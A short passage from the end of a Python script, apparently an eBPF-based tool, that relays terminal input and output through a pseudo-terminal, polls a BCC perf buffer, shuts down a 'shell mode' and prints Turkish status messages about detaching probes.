                    os.write(pty_fd, data)
                if pty_fd in r:
                    data = os.read(pty_fd, 4096)
                    if not data:
                        break
                    os.write(sys.stdout.fileno(), data)
                try:
                    b.perf_buffer_poll(timeout=1)
                except KeyboardInterrupt:
                    running = False
                    break
        finally:
            termios.tcsetattr(fd_in, termios.TCSADRAIN, old_settings)
        running = False
    else:
        while running:
            try:
                b.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                running = False

    if shell_mgr:
        print(f"\n  {Y}[*] Shell mode kapatiliyor...{RST}")
        shell_mgr.stop()

    print_stats()
    print(f"  {R}[!] Probe'lar ayrildi. Sistem temiz.{RST}\n")


if __name__ == "__main__":
    main()
